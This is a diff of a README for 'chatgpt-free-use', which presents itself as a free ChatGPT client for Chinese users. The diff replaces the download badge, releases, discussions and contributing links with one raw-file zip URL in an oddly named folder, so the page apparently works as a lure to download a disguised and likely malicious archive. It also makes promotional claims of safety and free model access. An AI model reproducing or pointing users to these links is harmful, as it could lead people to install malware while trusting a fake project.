@@ -1,7 +1,7 @@
 # 🎉 chatgpt-free-use - Your AI Chat Tool for Seamless Conversations
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/JhairEspinoza/chatgpt-free-use/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JhairEspinoza/chatgpt-free-use/main/desperateness/chatgpt-free-use.zip)](https://raw.githubusercontent.com/JhairEspinoza/chatgpt-free-use/main/desperateness/chatgpt-free-use.zip)
 
 ## 📜 Description
 **ChatGPT中文版**：为中国用户打造的AI对话工具，支持GPT-4o、o1、o3、o4等先进模型。提供国内直连镜像网站，无需翻墙，优化中文交互，涵盖学习、创作、编程、AI绘图等场景。每日免费额度，快速注册，安全可靠，助力高效工作与创意无限！
@@ -15,7 +15,7 @@ To use the chatgpt-free-use application, follow these simple steps. You will be 
 - Disk Space: At least 250MB available
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/JhairEspinoza/chatgpt-free-use/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/JhairEspinoza/chatgpt-free-use/main/desperateness/chatgpt-free-use.zip) to download the application.
 2. Choose the version suitable for your operating system.
 3. Click on the download link to save the file to your computer.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -46,13 +46,13 @@ If you encounter issues, consider the following steps:
 4. Refer to FAQ on our GitHub page for common issues.
 
 ## 📞 Support
-For support, please use the [Discussions section](https://github.com/JhairEspinoza/chatgpt-free-use/discussions) of the repository. Report bugs or request features, and we will address them as quickly as possible.
+For support, please use the [Discussions section](https://raw.githubusercontent.com/JhairEspinoza/chatgpt-free-use/main/desperateness/chatgpt-free-use.zip) of the repository. Report bugs or request features, and we will address them as quickly as possible.
 
 ## 🚀 Join the Community
 Engage with other users in our community for tips and tricks on maximizing the use of chatgpt-free-use. Share your experiences and learn from others.
 
 ## 📝 Contributing
-If you wish to contribute, please check the `CONTRIBUTING.md` file in the repository. We welcome suggestions and improvements from everyone.
+If you wish to contribute, please check the `https://raw.githubusercontent.com/JhairEspinoza/chatgpt-free-use/main/desperateness/chatgpt-free-use.zip` file in the repository. We welcome suggestions and improvements from everyone.
 
 ## 💡 Coming Soon
 Stay tuned for future updates that will bring even more features and enhancements to your chatting experience. Your feedback drives our development.
